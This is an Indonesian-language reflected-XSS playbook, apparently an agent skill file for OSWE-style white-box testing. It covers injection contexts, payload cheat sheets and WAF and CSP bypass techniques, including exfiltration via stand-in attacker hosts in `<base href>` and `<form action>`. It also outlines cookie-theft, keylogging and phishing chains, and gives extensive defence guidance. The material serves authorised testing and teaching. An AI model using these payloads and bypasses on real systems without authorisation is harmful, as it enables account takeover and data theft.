---
name: "Reflected XSS — OSWE White-Box Playbook"
description: "Playbook reflected XSS tingkat OSWE untuk konsultan white-box: mekanisme, konteks injeksi, bypass filter/WAF, rantai eksploitasi, deteksi manual, tooling, dan defense. Mengindeks analisis 8 subagent dan berkas companion."
tags: [xss, reflected-xss, oswe, web-300, white-box, context-aware-encoding, csp, trusted-types, waf-bypass, dom-xss, exploitation-chains]
---

# Reflected XSS — OSWE White-Box Playbook

Dokumen ini adalah titik masuk tunggal agar agent memahami **reflected XSS** pada level OffSec WEB-300 (OSWE): dari mekanisme hingga rantai eksploitasi, deteksi manual, tooling, dan pertahanan. Setiap bagian merujuk ke berkas companion yang memuat detail lengkap.

> **Prinsip OSWE:** kode adalah otoritas. Reflected XSS hanya bernilai bila ada jalur dari input yang dikendalikan penyerang ke sink yang mengeksekusi, dibuktikan dengan request/response dan lokasi `file:line`.

---

## 0. Definisi dan klasifikasi

**Reflected XSS** = payload penyerang masuk lewat request, server mengecho (reflect) input itu di response tanpa encoding yang tepat, browser mem-parse nilai yang direfleksikan sebagai kode dalam konteks origin korban. Payload **tidak persisten** server-side; korban harus dipancing mengirim request tersebut (link phishing, form auto-submit).

### Decision tree klasifikasi

```
Payload persisten di DB/file/cache dan dilayani ke user lain nanti?
├── YES → Stored XSS
└── NO → Eksekusi dipicu murni oleh JS client membaca source
         (location.hash, document.referrer, postMessage, window.name) tanpa round-trip payload di response?
         ├── YES → DOM-based XSS
         └── NO → Reflected XSS (payload request→response dalam satu transaksi)
```

Sinyal pembeda: persistence (DB), keberadaan payload di response server, kebutuhan klik link, sumber taint (param/header/path vs record tersimpan vs `location.*`), sink (server-rendered HTML vs client JS sink).

Berkas companion: `reflected-xss-detection-oswe.md` (bagian klasifikasi & false positive).

---

## 1. Mekanisme dan titik refleksi

### Alur eksekusi

```
[1] Request membawa input penyerang (GET/POST/header/path/cookie)
[2] Server mengekstrak input, interpolasi ke template response
[3] Response dikembalikan (tanpa encoding / konteks salah)
[4] Browser mem-parse response sebagai HTML → payload dieksekusi di origin korban
```

### Titik refleksi (reflection points)

| Titik | Masuk | Echo khas | Catatan |
|---|---|---|---|
| Query parameter | `?q=`, `?id=`, `?redirect=` | hasil pencarian, halaman error, pagination | paling umum; "no results" page |
| Path segment | `/user/<name>/profile` | breadcrumb, halaman 404, error routing | sering di `<title>` atau template error |
| HTTP header | `Referer`, `User-Agent`, `X-Forwarded-For`, `Accept-Language` | dashboard admin, analytics, log yang dirender | butuh app yang merender nilai header |
| Fragment (client) | `#payload` | JS membaca `location.hash` → DOM | DOM-based, tapi sering "reflected" via bootstrap server |
| Form field | POST `name=`, `email=` | halaman konfirmasi/preview, error validasi | pola "You entered: X" |
| Cookie | `Cookie: pref=...` | banner personalisasi, widget "welcome back" | sering digabung cookie injection |

Header specifics: `Referer` (back link/analytics; bisa bawa `javascript:` URI di app lama), `User-Agent` (admin session list), `X-Forwarded-For` (widget IP; spoofable), `X-Forwarded-Host`/`Host` (generasi URL absolut, password-reset → open redirect / XSS via host header injection).

### Kondisi "reflection without encoding"

Vulnerability ada iff input disalin ke response dalam konteks sintaksis berbeda dari saat diterima, tanpa transformasi yang menetralkan metacharacter untuk konteks itu.

Lokasi defect di stack:

| Layer | Pola defect | Contoh |
|---|---|---|
| Template engine (server) | interpolasi mentah: `{{ input \| safe }}` (Jinja), `<%= input %>` (ERB raw), `{!! $input !!}` (Blade), `{{{input}}}` (Handlebars unescaped) | Jinja `{{ q \| safe }}` |
| String concatenation | `response.write("<p>" + userInput + "</p>")` | echo PHP/ASP/JSP klasik |
| JSON-in-HTML | embed `JSON.stringify(userInput)` di `<script>` tanpa escape `</script>` | `<script>var x = {"q":"</script><img...>"}</script>` |
| Attribute context | atribut tanpa quote: `value={{input}}` | breakout dengan spasi + event handler |
| URL context | `href="{{input}}"` tanpa validasi scheme | `javascript:alert(1)` |
| CSS context | `style="color: {{input}}"` | `expression()` (IE lama) / `url()` exfil |
| Client-side JS | `element.innerHTML = location.search` | DOM-based, akar masalah sama |

Encoding wajib per konteks (context-aware):
- **HTML body:** encode `<`, `>`, `&`, `"`, `'`.
- **HTML attribute (quoted):** sama + quote matching.
- **JavaScript string:** `\uXXXX`/hex escape; jangan HTML-encode di dalam `<script>`.
- **URL:** percent-encoding + allowlist scheme.
- **CSS:** allowlist ketat; jangan masukkan user input di style.

Kegagalan umum: menerapkan HTML-entity encoding secara global (middleware) yang melindungi body tapi tidak JS/URL/CSS → bypass.

Berkas companion: `xss-dom-reflected-hybrid-oswe.md` (source/sink, hybrid, CSTI, prototype pollution).

---

## 2. Payload crafting per konteks injeksi

Prinsip: **identifikasi sink/konteks dulu**, lalu pilih payload terkecil yang mentransisikan data → kode.

### Cheat sheet konteks

| Tempat refleksi | Parser yang mengonsumsi | Pertanyaan pertama |
|---|---|---|
| Antar tag: `<div>HERE</div>` | HTML parser | Apakah di dalam raw-text element (`<textarea>`, `<title>`, `<script>`, `<style>`)? |
| Dalam nilai atribut | HTML attribute parser | Quoting? (`"`, `'`, none) + tipe atribut (URL/event/boolean/style) |
| Dalam `<script>...</script>` | JS parser | Tipe string literal, template literal, JSON, atau kode? |
| Dalam atribut bernilai URL | URL parser + allowlist scheme | Apakah `javascript:`/`data:` tercapai? |
| Dalam `<style>` atau `style=""` | CSS parser | `expression()` legacy atau quote break-out? |

### HTML body

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

SVG/MathML:

```html
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
<svg><circle cx=50 cy=50 r=40 onmouseover=alert(1)></circle></svg>
```

Catatan: di dalam raw-text element (`<textarea>`, `<title>`, `<script>`, `<style>`) karakter `<` adalah teks, bukan markup → harus tutup dulu (`</textarea>` dll.) lalu injeksi.

### Attribute context

Double-quoted: `"><img src=x onerror=alert(1)>`, `" onmouseover="alert(1)`, `" autofocus onfocus="alert(1)`.
Single-quoted: `'><img src=x onerror=alert(1)>`, `' onmouseover='alert(1)`.
Unquoted: `javascript:alert(1)`, `x onmouseover=alert(1)`.
Boolean: `autofocus onfocus=alert(1)`.

### JavaScript context

Single-quoted: `';alert(1)//`, `';alert(1);var x='`.
Double-quoted: `";alert(1)//`.
Template literal: `` `;alert(1)// ``, `${alert(1)}`.
JSON: `"};alert(1)//` atau `</script><script>alert(1)</script>` (HTML-level break).
JS URL: `javascript:alert(1)`.

### URL context

`javascript:alert(1)`, `javascript:alert(1)//http://example.com` (suffix helps bypass filter yang butuh substring http).
`data:text/html,<script>alert(1)</script>`, `data:text/html;base64,...`.

### CSS context

`</style><script>alert(1)</script>` (HTML-level break dari raw-text).
`"><script>alert(1)</script>` (attribute break-out).
Legacy IE: `expression(alert(1))`, `background:url(javascript:alert(1))`.
Modern: CSS tidak eksekusi JS; berguna untuk exfil data via `background-image`.

### Tabel ringkas lintas konteks

| Konteks | Payload minimal | Teknik break | Auto-fire? |
|---|---|---|---|
| HTML body | `<img src=x onerror=alert(1)>` | tag injection | Ya (onerror) |
| Attr (double) | `"><img src=x onerror=alert(1)>` | quote + tag break | Ya |
| Attr (in-attr) | `" onmouseover="alert(1)` | atribut baru | Tidak (hover) |
| Attr (unquoted) | `x onmouseover=alert(1)` | delimiter spasi | Tidak |
| JS string | `';alert(1)//` | quote + statement | Ya |
| Template literal | `` `;alert(1)// `` | backtick break | Ya |
| JSON in script | `</script><script>alert(1)</script>` | HTML break | Ya |
| URL href | `javascript:alert(1)` | scheme | Tidak (klik) |
| URL data | `data:text/html,<script>alert(1)</script>` | data doc | Bervariasi |
| CSS style attr | `"><script>alert(1)</script>` | quote + tag break | Ya |

Pitfall universal: parser yang memiliki sink (HTML vs JS vs CSS vs URL); lapisan encoding (HTML entity, URL, JS unicode, double encoding); filter vs sanitizer; CSP; auto-escaping framework; header `X-Content-Type-Options: nosniff`.

Berkas companion: berkas analisis konteks (payload crafting) — lihat §11.

---

## 3. Filter & WAF bypass

### Mental model: empat transformasi independen

Transport/WAF → filter aplikasi → template → parser browser. Bypass harus bertahan di 1–3 dengan makna berbahaya utuh, lalu diinterpretasi ulang sebagai kode oleh 4. Aturan OSWE: baca kode sanitasi dulu; tunjuk barisnya.

### Kelemahan filter blacklist

- **Case variation:** `<ScRiPt>`, `<SVG ONLOAD=...>` (nama tag/attr case-insensitive).
- **Null bytes:** `%00` memecah filter C/regex; tidak andal untuk eksekusi; perlakukan sebagai probe.
- **Komentar:** HTML/JS/CSS comment memecah token: `<scr<!--x-->ipt>`, `on<!-- -->error`, `alert/*x*/(1)`.
- **Encoding layers:** filter decode sekali, browser decode lagi; double URL `%253C`; entity di handler; JS `\u` escape; overlong UTF-8.

### Encoding & charset

- **HTML entity:** decode di text/attr/event handler, tapi TIDAK di raw-text element (`<script>`). Handler event decode sebelum eksekusi JS → `alert&#40;1&#41;`.
- **URL encoding:** `%3C`; probe jumlah decode.
- **Double encoding:** `%253C` hanya jika dua pass decode.
- **Unicode normalization:** fullwidth ＜script＞ kolaps via NFKC setelah filter.
- **UTF-7:** `+ADw-script+AD4-` bila charset utf-7.
- **UTF-16:** BOM + body UTF-16LE; WAF parse sebagai UTF-8.
- **Overlong UTF-8:** `%C0%BC`.

### Tag/attribute splitting & mXSS

- **Konkatenasi cross-parameter:** `?a=<scr&b=ipt>` → `<script>`.
- **Attribute breakouts:** quote variants, unquoted (spasi atau `/`), newline, backtick.
- **mXSS:** mutasi parser browser; foreign content MathML/SVG; payload klasik `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`; versi DOMPurify-specific.

### Polyglot & vektor agnostik konteks

Polyglot klasik; `javascript:` dengan tab/newline/entity; `data:` URI; `srcdoc`/iframe; SVG/MathML; event handler alternatif; tagged template `alert\`1\``; konstruksi string `top['al'+'ert']`.

### CSP bypass (lihat §5)

Inspeksi policy; nonce reuse/prediction/leakage; missing `base-uri` → `<base href>`; endpoint JSONP pada origin yang di-allowlist; dangling markup exfil nonce/token; `unsafe-inline`/`self` uploads/`unsafe-eval`/celah trusted-types.

### Metodologi praktis

- **Fase A:** identifikasi konteks.
- **Fase B:** probe char-by-char → peta transformasi.
- **Fase C:** pemetaan tag/atribut/scheme.
- **Fase D:** enumerasi lapisan encoding + jumlah decode.
- **Fase E:** differential testing (baseline/positive control/kandidat).
- **Fase F:** konfirmasi eksekusi (confirm/console.log/OOB, browser nyata).
- **Fase G:** white-box source review checklist.

Tooling: dalfox, xsstrike, Burp, DOM Invader. Standar proof/reporting: request/response, lokasi sink, PoC URL.

Berkas companion: `skills/web-pentest-payloads/references/xss-reflected-filter-waf-bypass.md`.

---

## 4. DOM-based & reflected hybrid

### Sources

`location.search`, `location.hash`, `document.referrer`, `window.name`, `postMessage`, storage (`localStorage`/`sessionStorage`).

### Sinks

`innerHTML`, `outerHTML`, `document.write`/`writeln`, `eval`, `setTimeout`/`setInterval` (bentuk string), assignment `location`, `insertAdjacentHTML`, `Range.createContextualFragment`, `script.text`/`textContent`.

### Reflected-DOM hybrid

Server reflect input ke variabel JS, lalu sink DOM mengeksekusi. Contoh: JSONP callback reflection; reflection ke config object gadget; attribute/event-handler breakout.

### CSTI → XSS

- AngularJS 1.x: sandbox escape per versi (1.6 hapus sandbox). Angular 2+: `bypassSecurityTrust*`.
- Vue: `v-html`, template compiler.
- React: `dangerouslySetInnerHTML`, `javascript:` href (pre-16).
- Svelte/Lit/Solid/Handlebars.

### Prototype pollution → XSS

Primitif `__proto__`/`constructor.prototype`; lib terdampak (lodash <4.17.12, jQuery <3.4.0); gadget chain (`srcdoc`, `innerHTML`, template); polusi via query URL.

### Deteksi

Static (CodeQL, Semgrep, eslint-plugin-no-unsanitized) vs dynamic (DOM Invader, XSS Hunter, harness Playwright). Metodologi hybrid OSWE + referensi sanitizer.

Berkas companion: `xss-dom-reflected-hybrid-oswe.md`.

---

## 5. Eksploitasi & chaining

### Session hijacking

`document.cookie` (jika tidak HttpOnly). HttpOnly → alternatif: token dari DOM/localStorage, CSRF token exfil.

### Account takeover (ATO)

Exfil CSRF token → in-place password/email change. Flow: reflected XSS → baca CSRF token dari DOM → POST change password/email → ATO.

### Keylogging & form grabbing

Listener `input`/`submit` → exfil keystrokes/form data.

### Phishing via reflected XSS

Overlay login palsu di atas halaman asli; kredensial dikirim ke penyerang.

### XSS → RCE

- Electron: `nodeIntegration`/IPC.
- Admin panel: webshell/config via XSS di panel admin.

### BeEF-style hooking & post-exploitation

Inject hook script; kontrol browser korban; pivot ke internal.

### Stealth & evasion

Obfuscation; exfil via DNS/img/WebRTC; kanal exfil CSP (report-uri, allowed hosts, JSONP).

Berkas companion: `xss-reflected-chains-oswe.md`.

---

## 6. Deteksi manual (workflow OSWE)

### Recon

Petakan parameter, header, titik refleksi. Tool: arjun, Param Miner, ffuf, ekstraksi JS, probe refleksi header. Hasilkan tabel reflection-map.

### Canary approach

String unik per parameter; lokasikan di response; klasifikasikan konteks (HTML body/attr/JS string/template/URL/CSS/comment/RCDATA); matriks encoding (HTML entity, JS escape, URL, stripping, double-decode).

### Workflow bertahap (Fase A–G)

Discovery parameter → canary → klasifikasi konteks → probe metachar → payload konteks → konfirmasi browser → dampak/chaining → reporting.

### False positive

Encoding-aware checks, konteks RCDATA/comment/JSON, jebakan cache/WAF/error-page, checklist verifikasi eksekusi.

### Partial / multi-part / konkatenasi

Canary per segmen, petakan semua titik refleksi, payload terpecah antar parameter terkonkatenasi, matriks transformasi.

### Reporting

Daftar evidence capture, template repro steps, statement impact, remediasi/retest, template entri laporan.

Berkas companion: `reflected-xss-detection-oswe.md` (658 baris, 11 contoh request HTTP, master checklist).

---

## 7. Tooling & automation

### Burp Suite

Scanner (active/passive, context-aware, scope/resource pools/throttle), Intruder (Sniper/Pitchfork/Cluster bomb, grep-match/extract, throttle), Repeater (probe konteks, varian encoding), DOM Invader (sources/sinks, canary injection, prototype-pollution + postMessage scan), extensions (ActiveScan++, XSS Validator, Reflector, Param Miner, Collaborator Everywhere, Backslash Powered Scanner).

### CLI manual

XSStrike (context-aware, crawl, blind, fuzzer), dalfox (url/file/pipe, `--deep-domxss`, `--blind`, `--waf-evasion`, JSON output), kxss (triage refleksi), gf (pola xss), qsreplace (ganti nilai param), airixss (canary refleksi), plus helper recon (gau, waybackurls, katana, httpx, uro).

### Skrip custom Python/Node

Fuzzer parameter async dengan canary unik per (url,param); klasifikasi konteks (html-body/attribute/js-string/url-attr); varian Node p-limit; output JSONL.

### Validasi headless

Playwright/Puppeteer: deteksi dialog+console, instrumentasi sink (override innerHTML/document.write/eval) untuk DOM XSS bahkan di bawah CSP, auth via cookie, konteks segar per URL, konstruksi window.name/postMessage.

### Integrasi pipeline

Scope file enforcement, rate limiting (semaphore, delay, per-host pool, backoff 429/503), dedup (normalisasi URL + kunci temuan), pipeline shell end-to-end (collect → scope → uro → httpx → gf → qsreplace → kxss → dalfox → headless), artefak reporting.

### Keterbatasan vs manual (OSWE)

Otomasi kuat di: breadth, raw reflection, first-pass context, konfirmasi headless, sink DOM standar. Celah: bypass konteks-spesifik, multi-step/second-order, auth/roles, sumber DOM kompleks, gadget prototype pollution, CSTI sandbox escape per versi, blind XSS, FP/FN, XSS logika bisnis. Realitas OSWE: white-box, tanpa internet, budget waktu, minimal PoC, chaining. Split effort 20/15/65 + checklist pra-deklarasi.

Berkas companion: `reflected-xss-tooling-automation-oswe.md`.

---

## 8. Pertahanan & bypass

### Output encoding (konteks → encoding)

| Konteks | Karakter minimal | Kelas encoder |
|---|---|---|
| HTML body | `<`, `>`, `&`, `"`, `'` | HTML entity encoder |
| HTML attr (double-quoted) | `"`, `>`, `&`, control | HTML attribute encoder |
| HTML attr (single-quoted) | `'`, `>`, `&`, control | attribute encoder (quote-aware) |
| HTML attr (unquoted) | spasi, `"`, `'`, `>`, `/`, `=`, control | hindari unquoted; jika tak bisa, allowlist ketat |
| JS string (single/double) | `\`, quote, newline, `<`, `>`, `&` | JS string encoder (hex/unicode) |
| JS template literal | backtick, `${`, `\`, newline, `<`, `>` | JS template encoder |
| URL (path/query) | percent-encode reserved + control; validasi scheme | URL/percent encoder |
| CSS string | `\`, `"`, `'`, `(`, `)`, `/`, `<`, `>`, control | CSS string encoder (hindari user input di CSS) |
| JSON di HTML | `<`, `>`, `&`, U+2028, U+2029 | JSON serializer dengan flag HTML-safe |

Encoder benar: .NET `System.Text.Encodings.Web` (`HtmlEncoder`, `JavaScriptEncoder`, `UrlEncoder`, `CssEncoder`); Java OWASP Java Encoder (`Encode.forHtml`, `forHtmlAttribute`, `forJavaScript`, `forUriComponent`, `forCssString`); Python `html.escape`, `markupsafe.escape`, Django autoescape; `urllib.parse.quote`; `json.dumps(..., ensure_ascii=True)`; Node `he`, `encodeurl`; Go `html/template` (context-aware) vs `text/template` (tidak); PHP `htmlspecialchars($x, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')`.

Kesalahan umum: konteks salah; blacklist filtering; encoding setelah konkatenasi; unquoted attr/CSS/JSON-in-script tak ditangani; error/exception page & proxy-generated page skip encoding; double decoding; partial encoding; input "sanitized" tersimpan (second-order XSS) tanpa re-encode saat render.

### CSP

Directives: `default-src`, `script-src`, `script-src-elem`, `script-src-attr`, `style-src`, `img-src`, `connect-src`, `font-src`, `frame-src`, `frame-ancestors`, `worker-src`, `manifest-src`, `object-src`, `base-uri`, `form-action`, `report-uri`, `report-to`, `sandbox`, `upgrade-insecure-requests`.

Nonce/hash/strict-dynamic: nonce per-request random ≥128 bit, tidak reuse, tidak leak; hash `sha256-...`; `strict-dynamic` mempercayai script yang dimuat script nonced/hashed. Strict CSP modern:

```
default-src 'self';
script-src 'nonce-RANDOM' 'strict-dynamic';
object-src 'none';
base-uri 'none';
frame-ancestors 'none';
report-uri /csp-report
```

Misconfig → bypass:

| Misconfig | Bypass |
|---|---|
| `script-src 'unsafe-inline'` | inline langsung |
| `script-src 'unsafe-eval'` | `eval`, `Function`, `setTimeout("...")` |
| Allowlist host terlalu luas (`*.googleapis.com`, `cdn.jsdelivr.net`) | endpoint JSONP/callback, AngularJS di CDN, gadget upload file |
| Missing `base-uri` | `<base href="https://attacker/">` hijack relative script src |
| Missing `object-src` | eksekusi plugin/object (di mana didukung) |
| Missing `form-action` | exfil via `<form action="https://attacker">` |
| Nonce statis/predictable/reuse | injeksi `nonce="KNOWN"` |
| Nonce leak via DOM/CSS/reflection | reuse nonce leak |
| Trusted script inject script dari user input | `strict-dynamic` propagasi trust ke URL penyerang |
| Multiple CSP header / parser differential | policy lebih lemah menang di beberapa browser |
| `Content-Security-Policy-Report-Only` | tidak enforce |
| `style-src 'unsafe-inline'` | exfil data via attribute selector / font loading |
| Missing trusted-types | tidak ada enforcement sink DOM XSS |

Bypass contoh: JSONP pada host allowlisted; base-uri hijack; gadget AngularJS di CDN allowlisted; trusted-bootstrap dynamic injection.

### Trusted Types & DOM XSS sinks

TT membuat sink berbahaya menolak string biasa, memerlukan `TrustedHTML`/`TrustedScript`/`TrustedScriptURL` dari policy terdaftar. Enforce: `Content-Security-Policy: require-trusted-types-for 'script'; trusted-types sanitize`.

Sinks: HTML insertion (`innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `document.writeln`, `Range.createContextualFragment`); script execution (`eval`, `Function`, `setTimeout(string)`, `setInterval(string)`, `script.text`, `script.textContent`); URL loading (`location.href/assign/replace`, `window.open`, `src`/`href` pada script/iframe/link/img).

Bypass/limitasi: no-op policy `createHTML: (x) => x`; injection pembuatan policy; celah coverage (beberapa path `setAttribute`, `DOMParser`, CSS injection); browser lama tanpa TT; CSTI (AngularJS/Vue/Handlebars) mengevaluasi ekspresi di HTML "sanitized"; prototype pollution mengubah config sanitizer (DOMPurify `ALLOWED_TAGS`) atau pemilihan policy; mXSS (payload lolos sanitizer tapi mutasi saat parsing); DOM clobbering menaungi objek policy/sanitizer.

Pola aman: satu policy ketat; larang `default` kecuali sanitize; sanitize dengan DOMPurify (selalu update) di dalam policy; validasi scheme URL sebelum `TrustedScriptURL`; padukan dengan strict CSP.

### WAF rules & bypass

ModSecurity CRS: famili 941xxx (XSS), 942xxx (SQLi); paranoia 1–4; anomaly scoring. Deteksi tag, event handler, `javascript:`, varian encoded, `onload`, `script`, `alert`. Bypass: case/whitespace/newline/tab, komentar HTML, double encoding, normalisasi Unicode, polyglot, HTTP parameter pollution (split payload antar duplikat param yang digabung backend), content-type confusion (WAF inspeksi query tapi tidak body `application/json` atau sebaliknya), multipart/form-data, chunked transfer-encoding, body oversize di atas limit inspeksi, mXSS, event handler alternatif (`onfocus`+`autofocus` bila `onerror` diblok), obfuscation scheme (`java\tscript:`, `&#106;avascript:`, `vbscript:` legacy), exclusion/tuning false-positive yang meninggalkan param tak terinspeksi.

Cloudflare: managed rules + OWASP core + custom; ML scoring. Bypass: encoding/chunking/param pollution, differential pseudo-header HTTP/2 & normalisasi path, Unicode & double encoding, exception rule untuk bot/path, content type jarang / body besar, gadget SVG/math yang menghindari keyword rule tapi eksekusi di sink DOM.

AWS WAF: managed rule groups (CRS, Known Bad Inputs, SQLi, XSS); rate-based; inspeksi query/body/header/cookie dengan **limit ukuran** (umum 8 KB, hingga 64 KB). Bypass: payload oversize (padding sebelum payload), body JSON tidak tercakup beberapa rule group, param pollution, encoding/normalisasi differential, request smuggling untuk kirim payload ke backend tanpa inspeksi WAF, request fragmented/chunked.

Prinsip umum: WAF adalah defense-in-depth, bukan boundary; parser differential; request smuggling/cache poisoning; context mismatch (payload di JSON yang nanti direfleksikan ke HTML); mutasi; reflection ≠ execution.

### Framework auto-escaping & titik gagal

- **React:** aman by default (JSX text & attribute escaped). Gagal: `dangerouslySetInnerHTML={{ __html: userInput }}`, `href={userInput}` (tidak blokir `javascript:`), `src`/`formAction`/`action`, `eval`/`new Function`. Mitigasi: DOMPurify sebelum dangerouslySetInnerHTML; validasi URL; lint ban.
- **Vue:** aman by default (`{{}}`, `v-bind`). Gagal: `v-html`, `:href` (`javascript:`), dynamic component `:is`, `v-bind` ke event handler. Mitigasi: DOMPurify untuk `v-html`; validasi scheme.
- **Angular:** aman by default (interpolasi escaped; `DomSanitizer` sanitizes `[innerHTML]`). Gagal: `bypassSecurityTrustHtml/Script/Url/ResourceUrl`; AngularJS 1.x template injection `{{constructor.constructor('alert(1)')()}}` bila input user dikompilasi; `[innerHTML]` dengan bypass. Mitigasi: jangan bypass sanitizer dengan input user; hindari kompilasi template user.
- **Django:** autoescape on; `{{ var }}` escaped. Gagal: `|safe`, `{% autoescape off %}`, `mark_safe()`, `format_html` misuse, JSON di `<script>` tanpa `|escapejs` atau `json_script`. Mitigasi: `{{ data|json_script:"id" }}`; `escapejs` untuk konteks JS.
- **Rails:** ERB `<%= %>` escaped (Rails 3+). Gagal: `<%== %>`, `raw`, `html_safe` pada input, `sanitize` permisif, `link_to`/`content_tag` dengan href tak tervalidasi. Mitigasi: `sanitize` strict allowlist; validasi URL; hindari `html_safe` pada input.
- **ASP.NET:** Razor `@variable` encode. Gagal: `@Html.Raw`, `Response.Write`, Blazor `MarkupString`, misuse `HttpUtility`. Mitigasi: `@Encoder.JavaScriptEncoder`; `Json.Serialize` dengan opsi HTML-safe; validasi.

Catatan cross-framework: SSR hydration mismatch bisa menimbulkan injection; markdown renderer, rich-text editor, web component, shadow DOM perlu review terpisah; komponen pihak ketiga sering bypass proteksi framework.

### Defense-in-depth & detection engineering

Rekomendasi: (1) context-aware output encoding di setiap sink (kontrol utama); (2) sanitasi (DOMPurify, selalu update) untuk rich HTML; (3) strict CSP (nonce + strict-dynamic; object-src none; base-uri none; no unsafe-inline/unsafe-eval); (4) Trusted Types enforcement dengan satu policy ketat; (5) validasi scheme URL (hanya http/https); (6) cookie `HttpOnly`, `Secure`, `SameSite=Lax/Strict`; (7) framework safe APIs only; ban dangerous sink via SAST/lint (Semgrep); (8) tidak ada template user-controlled; sandbox template engine; (9) input validation sebagai defense-in-depth (panjang, charset, format); (10) SRI untuk script pihak ketiga; (11) isolation iframe `sandbox`, cross-origin isolation; (12) WAF sebagai layer luar; (13) security headers (`X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`); (14) dependency hygiene (CVE DOMPurify, update framework); (15) jangan reflect input di error/WAF page; encode di sana juga.

Detection engineering: CSP reports (collect via report-uri/report-to; baseline Report-Only; alert spike/violation baru; filter noise; awasi nonce exfil & abuse strict-dynamic); WAF logs (deteksi pola XSS terblokir & upaya bypass berulang; tuning; awasi parser differential); XSS Auditor legacy (Chrome hapus XSS Auditor; tidak andal dan sendiri menimbulkan kerentanan; jangan andalkan; set `X-XSS-Protection: 0`); telemetry (canary token di halaman; deteksi endpoint exfil; korelasikan input reflected di response dengan laporan eksekusi script); SAST/DAST (Semgrep/CodeQL untuk dangerous sink: `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrustHtml`, `@Html.Raw`, `mark_safe`, `html_safe`; misuse DOMPurify; `eval`/`Function`); bug bounty/red team review berkala titik refleksi & gadget CSP di dependency; mutation testing (corpus mXSS terhadap sanitizer di CI).

Metodologi pengujian OSWE (reflected XSS): (1) enumerasi titik refleksi (grep source input yang di-echo di response/template); (2) tentukan parse context via DevTools/View Source (bukan hanya rendered DOM); (3) kirim probe minimal `<xssprobe>`; amati encoding/transformasi; (4) terapkan payload konteks-spesifik; konfirmasi eksekusi (`console.log`/`confirm` jika `alert` diblok); (5) inspeksi header CSP; coba bypass gadget (JSONP, base-uri, Angular, dynamic injection); (6) trace hybrid reflected+DOM sink (source→sink) untuk eksekusi tahap kedua; (7) uji WAF dengan variasi (encoding, case, whitespace, oversize, content-type, param pollution); dokumentasikan parser differential; (8) verifikasi PoC non-destruktif; untuk stored/hybrid, uji sebagai user/sesi lain; (9) dokumentasikan remediasi pemetaan ke context encoder + CSP + TT.

---

## 9. Pemetaan ke skill & referensi

| Kebutuhan | Skill/berkas |
|---|---|
| Katalog payload per kelas kerentanan | [web-pentest-payloads](../../web-pentest-payloads/SKILL.md) |
| Bypass filter & WAF XSS | [skills/web-pentest-payloads/references/xss-reflected-filter-waf-bypass.md](../../web-pentest-payloads/references/xss-reflected-filter-waf-bypass.md) |
| Persona white-box OSWE | [offsec-web-300](../SKILL.md) |
| Prototype pollution (gadget DOM XSS) | [prototype-pollution.md](./prototype-pollution.md) |
| Injection attacks | [injection-attacks.md](./injection-attacks.md) |

*(Catatan: path relatif terhadap `skills/offsec-web-300/references/`.)*

---

## 10. Daftar berkas companion (detail lengkap)

| Berkas | Isi | Ukuran |
|---|---|---|
| `xss-dom-reflected-hybrid-oswe.md` | source/sink, reflected-DOM hybrid, CSTI, prototype pollution, deteksi | ~432 baris |
| `xss-reflected-chains-oswe.md` | session hijacking, ATO, keylogging, phishing, XSS→RCE, BeEF, stealth | ~316 baris |
| `reflected-xss-detection-oswe.md` | deteksi manual, canary, workflow, false positive, partial/multi-part, reporting | ~658 baris |
| `reflected-xss-tooling-automation-oswe.md` | Burp, CLI, skrip, headless, pipeline, keterbatasan | ~703 baris |
| `skills/web-pentest-payloads/references/xss-reflected-filter-waf-bypass.md` | bypass filter & WAF untuk XSS refleksi | ~1 file |
| Analisis core mechanics & payload crafting & defense | disampaikan dalam sesi agent (lihat ringkasan §1–§2, §8) | — |

---

## 11. Quick checklist (agent)

- [ ] Tentukan konteks sink (HTML body/attr/JS/URL/CSS) via View Source, bukan hanya rendered DOM.
- [ ] Kirim canary unik; petakan lokasi & transformasi encoding.
- [ ] Pilih payload minimal sesuai konteks; konfirmasi eksekusi di browser nyata.
- [ ] Inspeksi header CSP; coba bypass gadget bila policy ada.
- [ ] Trace source→sink untuk hybrid reflected+DOM.
- [ ] Uji WAF dengan variasi (encoding, case, whitespace, oversize, content-type, param pollution).
- [ ] Dokumentasikan: request/response, lokasi sink `file:line`, PoC URL, dampak, remediasi.
- [ ] Non-destruktif; uji stored/hybrid sebagai user/sesi lain.

---

## Best Practices

- Selalu reproduksi di target yang **diotorisasi**; jangan uji sistem pihak ketiga tanpa scope.
- Konfirmasi **titik refleksi persis** (view source + DOM) sebelum crafting; DOM-based XSS bukan "reflected" dan butuh analisis berbeda.
- Lebih baik payload **terpendek yang membuktikan eksekusi** (`alert(1)` atau `print()`), lalu eskalasi ke beacon exfil benign hanya dalam scope.
- Dokumentasikan **konteks, encoding, dan bypass** yang dipakai — penilaian OSWE menghargai PoC minimal yang reprodusibel.
- Kode adalah otoritas: tunjukkan `file:line` untuk setiap klaim perilaku aplikasi.
- Rantai, bukan bug: temuan bernilai bila ada jalur dari input ke dampak.
- WAF adalah mitigasi sementara, bukan perbaikan; remediasi di kode.

---
*Playbook disintesis dari 8 analisis subagent (core mechanics, context-aware payloads, filter/WAF bypass, DOM reflected hybrid, exploitation chains, detection methodology, tooling/automation, defense & bypass) untuk OSWE (WEB-300) reflected XSS.*